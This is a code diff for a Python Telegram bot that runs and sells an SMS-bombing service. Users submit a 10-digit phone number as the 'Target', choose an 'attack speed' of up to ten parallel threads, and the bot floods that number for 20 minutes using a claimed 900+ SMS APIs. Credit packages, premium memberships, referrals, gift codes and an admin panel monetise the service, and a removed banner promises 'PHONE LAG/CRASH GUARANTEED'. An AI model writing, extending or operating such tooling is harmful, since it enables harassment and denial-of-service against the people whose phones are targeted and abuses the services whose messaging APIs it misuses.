+    bot.reply_to(m, "🎁 <b>Redeem Gift Code</b>\n\nSend your gift code now:")
+    bot.register_next_step_handler(m, process_redeem)
+
+def process_redeem(m):
+    code = m.text.strip().upper()
+    result = redeem_gift_code(m.from_user.id, code)
+    bot.reply_to(m, result["message"])
+
+@bot.message_handler(func=lambda m: m.text == "🎁 Redeem Code")
+def redeem_button(m):
+    redeem_cmd(m)
+
+@bot.message_handler(func=lambda m: m.text == "🚀 Start")
+def start_button(m):
+    start_cmd(m)
+
+@bot.message_handler(func=lambda m: m.text and m.text.isdigit() and len(m.text) == 10)
+def number_handler(m):
+    if is_blocked(m.from_user.id):
+        bot.reply_to(m, "🚫 Blocked!")
+        return
+    if not check_channel(m.from_user.id):
+        show_join(m.chat.id)
+        return
+    
+    uid = str(m.from_user.id)
+    if uid not in users:
+        users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        save_json(USERS_FILE, users)
+    
+    credits = users[uid].get("credits", 0)
+    if credits < 1:
+        bot.reply_to(m, "❌ <b>Insufficient credits!</b>\n\nBuy credits or refer friends.")
+        return
+    
+    phone = m.text
+    unlocked = get_unlocked_speeds(m.from_user.id)
+    
+    # ⚡ SPEED SELECTION KEYBOARD
+    kb = types.InlineKeyboardMarkup()
+    row = []
+    for speed in ["1x", "2x", "3x", "4x", "5x", "6x", "7x", "8x", "9x", "10x"]:
+        cost = SPEED_CREDITS[speed]
+        if speed in unlocked:
+            label = f"⚡ {speed} ({cost}💰)"
+        else:
+            label = f"🔒 {speed}"
+        
+        row.append(types.InlineKeyboardButton(label, callback_data=f"speed_{speed[:-1]}_{phone}"))
+        
+        if len(row) == 3:
+            kb.row(*row)
+            row = []
+    
+    if row:
+        kb.row(*row)
+    
+    bot.reply_to(m, f"""
+⚡ <b>SELECT ATTACK SPEED</b>
+
+📱 Target: <code>{phone}</code>
+💰 Your Credits: <b>{credits}</b>
+
+🟢 <b>Unlocked Speeds:</b> {', '.join(unlocked)}
+🔒 <b>Locked:</b> Premium/Admin unlock needed
+
+💡 <b>Speed Guide:</b>
+• 1x = Normal attack
+• 5x = 5x parallel threads
+• 10x = 10x parallel threads (INSANE!)
+
+Choose speed below:
+""", reply_markup=kb)
+
+@bot.message_handler(func=lambda m: m.text == "💰 My Credits")
+def credits_cmd(m):
+    if is_blocked(m.from_user.id):
+        return
+    uid = str(m.from_user.id)
+    credits = users.get(uid, {}).get("credits", 0)
+    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
+    unlocked = get_unlocked_speeds(m.from_user.id)
+    
+    if is_premium(m.from_user.id):
+        exp = datetime.fromisoformat(users[uid]["premium_until"])
+        days_left = (exp - datetime.now()).days
+        premium_info = f"\n⏰ Expires in: {days_left} days"
+    else:
+        premium_info = ""
+    
+    bot.reply_to(m, f"""
+💰 <b>Your Credits: {credits}</b>
+👑 Premium: {premium_status}{premium_info}
+
+⚡ <b>Unlocked Speeds:</b>
+{', '.join(unlocked)}
+
+🔒 <b>Locked Speeds:</b>
+{', '.join([s for s in SPEED_CREDITS.keys() if s not in unlocked])}
+""")
 
 @bot.message_handler(func=lambda m: m.text == "📊 Stats")
-def btn_stats(m):
-    u = users.get(str(m.from_user.id), {})
-    bot.reply_to(m, f"📊 <b>Stats</b>\n\n🎯 Total: {u.get('total', 0)}\n📅 Joined: {u.get('joined', 'Unknown')[:10]}")
+def stats_cmd(m):
+    if is_blocked(m.from_user.id):
+        return
+    uid = str(m.from_user.id)
+    user_data = users.get(uid, {})
+    
+    bot.reply_to(m, f"""
+📊 <b>Your Statistics</b>
 
-@bot.message_handler(func=lambda m: m.text == "🎁 Gift Code")
-def btn_redeem(m):
-    msg = bot.reply_to(m, "🎁 <b>Enter code:</b>")
-    bot.register_next_step_handler(msg, process_gift_code)
+💰 Credits: <b>{user_data.get('credits', 0)}</b>
+👑 Premium: <b>{'Yes' if is_premium(m.from_user.id) else 'No'}</b>
+📅 Joined: <b>{user_data.get('joined', 'Unknown')[:10]}</b>
 
-def process_gift_code(m):
-    code = m.text.upper().strip()
-    if code not in giftcodes:
-        return bot.reply_to(m, "❌ Invalid!")
-    c = giftcodes[code]
-    if str(m.from_user.id) in c.get("used", []):
-        return bot.reply_to(m, "❌ Used!")
-    if len(c.get("used", [])) >= c["max"]:
-        return bot.reply_to(m, "❌ Limit!")
-    u = users[str(m.from_user.id)]
-    u["cr"] = u.get("cr", 0) + c["cr"]
-    if "used" not in c:
-        c["used"] = []
-    c["used"].append(str(m.from_user.id))
-    giftcodes[code] = c
-    users[str(m.from_user.id)] = u
-    save_json(FILES["giftcodes"], giftcodes)
-    save_json(FILES["users"], users)
-    bot.reply_to(m, f"✅ +{c['cr']} credits!\n💰 Balance: {u['cr']}")
+🚀 <b>Active APIs:</b> {len([a for a in apis_db if a['active']])}
+👥 <b>Total Users:</b> {len(users)}
+""")
+
+@bot.message_handler(func=lambda m: m.text == "🔗 Refer")
+def refer_cmd(m):
+    if is_blocked(m.from_user.id):
+        return
+    uid = str(m.from_user.id)
+    bot_username = bot.get_me().username
+    ref_link = f"https://t.me/{bot_username}?start=ref_{uid}"
+    bot.reply_to(m, f"🔗 <b>Refer & Earn!</b>\n\nYour link:\n<code>{ref_link}</code>\n\n💰 Earn {REF_CREDITS} credit per referral!")
+
+@bot.message_handler(func=lambda m: m.text == "💳 Buy Credits & Premium")
+def buy_cmd(m):
+    if is_blocked(m.from_user.id):
+        return
+    
+    prices = settings.get("credit_prices", CREDIT_PRICES)
+    premium = settings.get("premium_price", PREMIUM_PRICE)
+    owner = settings.get("owner_username", OWNER_USERNAME)
+    
+    msg = "💳 <b>BUY CREDITS & PREMIUM</b>\n\n"
+    msg += "💰 <b>CREDIT PACKAGES:</b>\n"
+    for price_data in prices.values():
+        msg += f"• {price_data['label']}\n"
+    
+    msg += f"\n👑 <b>PREMIUM MEMBERSHIP:</b>\n"
+    msg += f"• {premium['label']}\n\n"
+    msg += f"<b>Premium Benefits:</b>\n"
+    msg += f"✅ All Speed Modes Unlocked (1x-10x)\n"
+    msg += f"✅ Daily {premium['daily_credits']} Credits Auto-Added\n"
+    msg += f"✅ Priority Support\n"
+    msg += f"✅ No Restrictions\n\n"
+    msg += f"📞 <b>Contact:</b> {owner}"
+    
+    bot.reply_to(m, msg)
 
 @bot.message_handler(func=lambda m: m.text == "❓ Help")
-def btn_help(m):
-    bot.reply_to(m, f"📘 <b>How to use:</b>\n\n1️⃣ Click 💥 Crash Bombing\n2️⃣ Select duration\n3️⃣ Send number\n4️⃣ Done!\n\n📞 {OWNER_USERNAME}")
+def help_cmd(m):
+    bot.reply_to(m, f"""
+📘 <b>SPEED BOMBER GUIDE</b>
 
-# ============================================================================
-# ADMIN BOT
-# ============================================================================
+<b>🎯 How to Use:</b>
+1️⃣ Send 10-digit phone number
+2️⃣ Select speed (1x-10x)
+3️⃣ Bot bombs for 20 minutes
+4️⃣ Credits deducted based on speed
 
+<b>⚡ Speed System:</b>
+• 1x = 1 credit (1 thread)
+• 5x = 5 credits (5 threads)
+• 10x = 10 credits (10 threads!)
+
+<b>💡 Features:</b>
+• 900+ Working APIs
+• Real-time statistics
+• Stop anytime
+• Progressive speed unlocks
+• Premium unlimited speeds
+
+<b>🎁 Earn Credits:</b>
+• Refer friends: {REF_CREDITS} credit each
+• Redeem gift codes
+• Buy credit packages
+• Get premium membership
+
+<b>🔒 Unlock Speeds:</b>
+• Premium: All speeds unlocked
+• Admin unlock: Contact owner
+""")
+
+@bot.message_handler(func=lambda m: m.text == "📞 Owner")
+def owner_cmd(m):
+    owner = settings.get("owner_username", OWNER_USERNAME)
+    bot.reply_to(m, f"📞 <b>Owner Contact</b>\n\n👤 {owner}\n\n💼 For credits, premium & speed unlocks")
+
+
+# ==================== ADMIN BOT HANDLERS ====================
 @admin_bot.message_handler(commands=["start"])
 def admin_start(m):
     if not is_admin(m.from_user.id):
+        admin_bot.reply_to(m, "❌ Unauthorized!")
         return
-    admin_bot.reply_to(m, "🔐 <b>ADMIN</b>\n\n/add ID CR\n/set ID CR\n/check ID\n/creategift CR MAX\n/listgifts\n/stats\n/broadcast msg")
+    
+    status = "🟢 Active" if settings.get("bot_active", True) else "🔴 Maintenance"
+    
+    admin_bot.reply_to(m, f"""
+🔐 <b>ADMIN PANEL - SPEED BOMBER</b>
+
+Status: {status}
+
+<b>📊 Bot Control:</b>
+/on - Turn bot ON
+/off - Turn bot OFF
+/stats - Bot statistics
+
+<b>👥 User Management:</b>
+/add uid credits
+/set uid credits
+/check uid
+/block uid
+/unblock uid
+/addpremium uid days
+
+<b>⚡ SPEED UNLOCK SYSTEM (NEW):</b>
+/unlock uid 4x - Unlock specific speed
+/unlock uid 5x
+/unlockall uid - Unlock all speeds
+/checkspeed uid - Check unlocked speeds
+/lockspeed uid 5x - Lock a speed
+
+<b>🎁 Gift Code System:</b>
+/createcode credits uses [days]
+/listcodes - Show all codes
+/deletecode CODE
+/codeinfo CODE
+
+<b>🚀 API Management:</b>
+/listapis - Show all APIs
+/toggleapi id - Enable/disable API
+/apicount - Count active APIs
+
+<b>💰 Price Management:</b>
+/setprice amount credits
+/setpremium price days daily_credits
+/showprices
+
+<b>🔗 Channel Management:</b>
+/addchannel name id link
+/removechannel name
+/listchannels
+
+<b>🤖 Bot Token Management:</b>
+/changetoken new_token
+/changeadmintoken new_token
+/currenttoken
+/reloadbot - How to reload
+
+<b>📢 Broadcast:</b>
+/broadcast message
+""")
+
+@admin_bot.message_handler(commands=["on"])
+def admin_on(m):
+    if not is_admin(m.from_user.id):
+        return
+    settings["bot_active"] = True
+    save_json(SETTINGS_FILE, settings)
+    admin_bot.reply_to(m, "✅ Bot ON!")
+
+@admin_bot.message_handler(commands=["off"])
+def admin_off(m):
+    if not is_admin(m.from_user.id):
+        return
+    settings["bot_active"] = False
+    save_json(SETTINGS_FILE, settings)
+    admin_bot.reply_to(m, "🔴 Bot OFF!")
+
+@admin_bot.message_handler(commands=["stats"])
+def admin_stats(m):
+    if not is_admin(m.from_user.id):
+        return
+    
+    total_users = len(users)
+    premium_users = sum(1 for uid in users if is_premium(int(uid)))
+    total_credits = sum(u.get("credits", 0) for u in users.values())
+    active_apis = sum(1 for a in apis_db if a["active"])
+    total_codes = len(giftcodes)
+    active_codes = sum(1 for g in giftcodes.values() if len(g["used_by"]) < g["max_uses"])
+    
+    admin_bot.reply_to(m, f"""
+📊 <b>Bot Statistics</b>
+
+👥 Total Users: {total_users}
+👑 Premium Users: {premium_users}
+💰 Total Credits: {total_credits}
+🚀 Active APIs: {active_apis}/{len(apis_db)}
+🚫 Blocked: {len(blocked)}
+🎁 Gift Codes: {active_codes}/{total_codes} active
+""")
+
+# ⚡ NEW: SPEED UNLOCK COMMANDS
+@admin_bot.message_handler(commands=["unlock"])
+def admin_unlock_speed(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        parts = m.text.split()
+        if len(parts) != 3:
+            admin_bot.reply_to(m, "❌ Usage: /unlock uid speed\nExample: /unlock 123456 5x")
+            return
+        
+        uid = str(parts[1])
+        speed = parts[2]
+        
+        if speed not in SPEED_CREDITS:
+            admin_bot.reply_to(m, f"❌ Invalid speed! Valid: {', '.join(SPEED_CREDITS.keys())}")
+            return
+        
+        if uid not in users:
+            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        
+        unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
+        
+        if speed in unlocked:
+            admin_bot.reply_to(m, f"⚠️ User {uid} already has {speed} unlocked!")
+            return
+        
+        unlocked.append(speed)
+        users[uid]["unlocked_speeds"] = unlocked
+        save_json(USERS_FILE, users)
+        
+        admin_bot.reply_to(m, f"✅ Unlocked {speed} for user {uid}!")
+        
+        try:
+            bot.send_message(int(uid), f"🎉 <b>Speed Unlocked!</b>\n\n⚡ You now have access to {speed} speed mode!")
+        except:
+            pass
+    except Exception as e:
+        admin_bot.reply_to(m, f"❌ Error: {e}")
+
+@admin_bot.message_handler(commands=["unlockall"])
+def admin_unlock_all(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        uid = str(m.text.split()[1])
+        
+        if uid not in users:
+            users[uid] = {"credits": 0, "joined": str(datetime.now())}
+        
+        users[uid]["unlocked_speeds"] = list(SPEED_CREDITS.keys())
+        save_json(USERS_FILE, users)
+        
+        admin_bot.reply_to(m, f"✅ All speeds unlocked for user {uid}!")
+        
+        try:
+            bot.send_message(int(uid), "🎉 <b>ALL SPEEDS UNLOCKED!</b>\n\n⚡ You now have access to 1x-10x speed modes!")
+        except:
+            pass
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /unlockall uid")
+
+@admin_bot.message_handler(commands=["checkspeed"])
+def admin_check_speed(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        uid = str(m.text.split()[1])
+        
+        if uid not in users:
+            admin_bot.reply_to(m, "❌ User not found!")
+            return
+        
+        unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
+        locked = [s for s in SPEED_CREDITS.keys() if s not in unlocked]
+        
+        admin_bot.reply_to(m, f"""
+⚡ <b>Speed Status for {uid}</b>
+
+🟢 <b>Unlocked:</b> {', '.join(unlocked)}
+🔒 <b>Locked:</b> {', '.join(locked) if locked else 'None'}
+👑 <b>Premium:</b> {'Yes' if is_premium(int(uid)) else 'No'}
+""")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /checkspeed uid")
+
+@admin_bot.message_handler(commands=["lockspeed"])
+def admin_lock_speed(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        parts = m.text.split()
+        if len(parts) != 3:
+            admin_bot.reply_to(m, "❌ Usage: /lockspeed uid speed")
+            return
+        
+        uid = str(parts[1])
+        speed = parts[2]
+        
+        if uid not in users:
+            admin_bot.reply_to(m, "❌ User not found!")
+            return
+        
+        unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
+        
+        if speed not in unlocked:
+            admin_bot.reply_to(m, f"⚠️ User doesn't have {speed} unlocked!")
+            return
+        
+        unlocked.remove(speed)
+        users[uid]["unlocked_speeds"] = unlocked
+        save_json(USERS_FILE, users)
+        
+        admin_bot.reply_to(m, f"✅ Locked {speed} for user {uid}!")
+    except Exception as e:
+        admin_bot.reply_to(m, f"❌ Error: {e}")
 
 @admin_bot.message_handler(commands=["add"])
 def admin_add(m):
     if not is_admin(m.from_user.id):
         return
     try:
-        parts = m.text.split()
-        chat_id = parts[1].strip()
-        credits = int(parts[2])
-        if not chat_id.isdigit():
-            return admin_bot.reply_to(m, "❌ Invalid ID!")
-        uid = int(chat_id)
-        if str(uid) not in users:
-            users[str(uid)] = {"name": "User", "cr": 0, "joined": datetime.now().isoformat(), "total": 0}
-        u = users[str(uid)]
-        u["cr"] = u.get("cr", 0) + credits
-        users[str(uid)] = u
-        save_json(FILES["users"], users)
-        admin_bot.reply_to(m, f"✅ +{credits} to {uid}\n💰 {u['cr']}")
+        _, uid, amount = m.text.split()
+        uid, amount = str(uid), int(amount)
+        if uid not in users:
+            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        users[uid]["credits"] = users[uid].get("credits", 0) + amount
+        save_json(USERS_FILE, users)
+        admin_bot.reply_to(m, f"✅ Added {amount} credits to {uid}")
         try:
-            bot.send_message(uid, f"🎁 +{credits} credits!")
+            bot.send_message(int(uid), f"🎁 +{amount} credits added by admin!")
         except:
             pass
-    except Exception as e:
-        admin_bot.reply_to(m, f"❌ {e}")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /add uid amount")
 
 @admin_bot.message_handler(commands=["set"])
 def admin_set(m):
     if not is_admin(m.from_user.id):
         return
     try:
-        parts = m.text.split()
-        chat_id = parts[1].strip()
-        credits = int(parts[2])
-        if not chat_id.isdigit():
-            return admin_bot.reply_to(m, "❌ Invalid!")
-        uid = int(chat_id)
-        if str(uid) not in users:
-            users[str(uid)] = {"name": "User", "cr": 0, "joined": datetime.now().isoformat(), "total": 0}
-        u = users[str(uid)]
-        old = u.get("cr", 0)
-        u["cr"] = credits
-        users[str(uid)] = u
-        save_json(FILES["users"], users)
-        admin_bot.reply_to(m, f"✅ {uid}\n💰 {old} → {credits}")
-    except Exception as e:
-        admin_bot.reply_to(m, f"❌ {e}")
+        _, uid, amount = m.text.split()
+        uid, amount = str(uid), int(amount)
+        if uid not in users:
+            users[uid] = {"joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        users[uid]["credits"] = amount
+        save_json(USERS_FILE, users)
+        admin_bot.reply_to(m, f"✅ Set {uid} credits to {amount}")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /set uid amount")
 
 @admin_bot.message_handler(commands=["check"])
 def admin_check(m):
     if not is_admin(m.from_user.id):
         return
     try:
-        chat_id = m.text.split()[1].strip()
-        if not chat_id.isdigit():
-            return admin_bot.reply_to(m, "❌ Invalid!")
-        uid = int(chat_id)
-        if str(uid) not in users:
-            return admin_bot.reply_to(m, "❌ Not found!")
-        u = users[str(uid)]
-        admin_bot.reply_to(m, f"👤 {uid}\n💰 {u.get('cr', 0)}\n🎯 {u.get('total', 0)}")
-    except Exception as e:
-        admin_bot.reply_to(m, f"❌ {e}")
+        uid = m.text.split()[1]
+        if uid not in users:
+            admin_bot.reply_to(m, "❌ User not found!")
+            return
+        data = users[uid]
+        premium = "Yes" if is_premium(int(uid)) else "No"
+        unlocked = data.get("unlocked_speeds", ["1x", "2x", "3x"])
+        
+        admin_bot.reply_to(m, f"""
+👤 <b>User Info</b>
 
-@admin_bot.message_handler(commands=["creategift"])
-def admin_gift(m):
+ID: <code>{uid}</code>
+💰 Credits: {data.get('credits', 0)}
+👑 Premium: {premium}
+⚡ Unlocked Speeds: {', '.join(unlocked)}
+📅 Joined: {data.get('joined', 'Unknown')[:10]}
+""")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /check uid")
+
+@admin_bot.message_handler(commands=["block"])
+def admin_block(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        uid = int(m.text.split()[1])
+        if uid not in blocked:
+            blocked.append(uid)
+            save_json(BLOCKED_FILE, blocked)
+            admin_bot.reply_to(m, f"✅ Blocked {uid}")
+        else:
+            admin_bot.reply_to(m, "Already blocked!")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /block uid")
+
+@admin_bot.message_handler(commands=["unblock"])
+def admin_unblock(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        uid = int(m.text.split()[1])
+        if uid in blocked:
+            blocked.remove(uid)
+            save_json(BLOCKED_FILE, blocked)
+            admin_bot.reply_to(m, f"✅ Unblocked {uid}")
+        else:
+            admin_bot.reply_to(m, "Not blocked!")
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /unblock uid")
+
+@admin_bot.message_handler(commands=["addpremium"])
+def admin_addpremium(m):
+    if not is_admin(m.from_user.id):
+        return
+    try:
+        _, uid, days = m.text.split()
+        uid, days = str(uid), int(days)
+        
+        if uid not in users:
+            users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
+        
+        expiry = datetime.now() + timedelta(days=days)
+        users[uid]["premium_until"] = expiry.isoformat()
+        # Premium users get all speeds unlocked automatically
+        users[uid]["unlocked_speeds"] = list(SPEED_CREDITS.keys())
+        save_json(USERS_FILE, users)
+        
+        admin_bot.reply_to(m, f"✅ Added {days} days premium to {uid}")
+        try:
+            bot.send_message(int(uid), f"👑 <b>PREMIUM ACTIVATED!</b>\n\n⏰ Duration: {days} days\n⚡ All speeds unlocked!\n💰 Daily {PREMIUM_PRICE['daily_credits']} credits")
+        except:
+            pass
+    except:
+        admin_bot.reply_to(m, "❌ Usage: /addpremium uid days")
+
+@admin_bot.message_handler(commands=["createcode"])
+def admin_createcode(m):
     if not is_admin(m.from_user.id):
         return
     try:
         parts = m.text.split()
+        if len(parts) < 3:
+            admin_bot.reply_to(m, "❌ Usage: /createcode credits uses [days]")
+            return
+        
         credits = int(parts[1])
-        max_uses = int(parts[2])
-        code = generate_gift_code()
-        giftcodes[code] = {"cr": credits, "max": max_uses, "used": []}
-        save_json(FILES["giftcodes"], giftcodes)
-        admin_bot.reply_to(m, f"✅ <code>{code}</code>\n💰 {credits}cr\n👥 {max_uses} uses")
-    except Exception as e:
-        admin_bot.reply_to(m, f"❌ {e}")
+        uses = int(parts[2])
+        expires = int(parts[3]) if len(parts) == 4 else None
+        
+        code = create_gift_code(credits, uses, expires)
+        
+        exp_text = f"\n⏰ Expires: {expires} days" if expires else ""
+        admin_bot.reply_to(m, f"""
+✅ <b>Gift Code Created!</b>
 
-@admin_bot.message_handler(commands=["listgifts"])
-def admin_list(m):
+🎁 Code: <code>{code}</code>
+💰 Credits: {credits}
+🔢 Max Uses: {uses}{exp_text}
+""")
+    except Exception as e:
+        admin_bot.reply_to(m, f"❌ Error: {e}")
+
+@admin_bot.message_handler(commands=["listcodes"])
+def admin_listcodes(m):
     if not is_admin(m.from_user.id):
         return
+    
     if not giftcodes:
-        return admin_bot.reply_to(m, "📋 No codes!")
-    msg = "🎁 <b>Codes:</b>\n\n"
-    for code, c in giftcodes.items():
-        used = len(c.get("used", []))
-        msg += f"<code>{code}</code> - {c['cr']}cr ({used}/{c['max']})\n"
+        admin_bot.reply_to(m, "📭 No gift codes!")
+        return
+    
+    msg = "🎁 <b>Active Gift Codes:</b>\n\n"
+    for code, data in giftcodes.items():
+        used = len(data["used_by"])
+        max_uses = data["max_uses"]
+        msg += f"<code>{code}</code> - {data['credits']}💰 ({used}/{max_uses} used)\n"
+    
     admin_bot.reply_to(m, msg)
 
-@admin_bot.message_handler(commands=["stats"])
-def admin_stats(m):
-    if not is_admin(m.from_user.id):
-        return
-    total_users = len(users)
-    total_credits = sum(u.get("cr", 0) for u in users.values())
-    active_sess = sum(1 for s in sessions.values() if s.get("active"))
-    admin_bot.reply_to(m, f"📊 Users: {total_users}\n💰 Credits: {total_credits}\n🔥 Active: {active_sess}")
-
 @admin_bot.message_handler(commands=["broadcast"])
-def admin_bc(m):
+def admin_broadcast(m):
     if not is_admin(m.from_user.id):
         return
     try:
         msg = m.text.replace("/broadcast ", "", 1)
         if not msg:
-            return admin_bot.reply_to(m, "❌ /broadcast MSG")
+            admin_bot.reply_to(m, "❌ Usage: /broadcast message")
+            return
+        
         success = 0
+        fail = 0
         for uid in users:
             try:
-                bot.send_message(int(uid), f"📢 {msg}")
+                bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}")
                 success += 1
                 time.sleep(0.05)
             except:
-                pass
-        admin_bot.reply_to(m, f"✅ Sent to {success} users")
+                fail += 1
+        
+        admin_bot.reply_to(m, f"✅ Broadcast complete!\n\n✅ Success: {success}\n❌ Failed: {fail}")
     except Exception as e:
-        admin_bot.reply_to(m, f"❌ {e}")
+        admin_bot.reply_to(m, f"❌ Error: {e}")
 
-# ============================================================================
-# START
-# ============================================================================
-
-def run_main_bot():
+# ==================== START BOTS ====================
+def start_main_bot():
     while True:
         try:
             logger.info("🤖 Main bot starting...")
             bot.infinity_polling(timeout=60, long_polling_timeout=60)
         except Exception as e:
-            logger.error(f"Error: {e}")
+            logger.error(f"Main bot error: {e}")
             time.sleep(5)
 
-def run_admin_bot():
+def start_admin_bot():
     while True:
         try:
             logger.info("⚙️ Admin bot starting...")
             admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
         except Exception as e:
-            logger.error(f"Error: {e}")
+            logger.error(f"Admin bot error: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
-    print("\n" + "="*60)
-    print("╔════════════════════════════════════════════════╗")
-    print("║   💥 SMS CRASH BOMBER - ULTRA FAST 💥         ║")
-    print("║                                                ║")
-    print(f"║   {len(CRASH_APIS)} SMS APIs                              ║")
-    print("║   NO DELAYS - MAXIMUM SPEED                    ║")
-    print("║   PHONE LAG/CRASH GUARANTEED                   ║")
-    print("║                                                ║")
-    print("╚════════════════════════════════════════════════╝")
-    print("="*60)
+    logger.info("🚀 Starting Ultimate Speed Bomber...")
+    logger.info(f"✅ Main bot: @{bot.get_me().username}")
+    logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")
     
-    main_thread = threading.Thread(target=run_main_bot, daemon=True)
-    admin_thread = threading.Thread(target=run_admin_bot, daemon=True)
+    main_thread = threading.Thread(target=start_main_bot, daemon=True)
+    admin_thread = threading.Thread(target=start_admin_bot, daemon=True)
     
     main_thread.start()
     admin_thread.start()
     
-    logger.info("✅ Both bots started!")
+    logger.info("✅ Bots running with Speed Multiplier System!")
     
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n👋 Stopped!")
+        logger.info("⚠️ Stopping bots...")
+
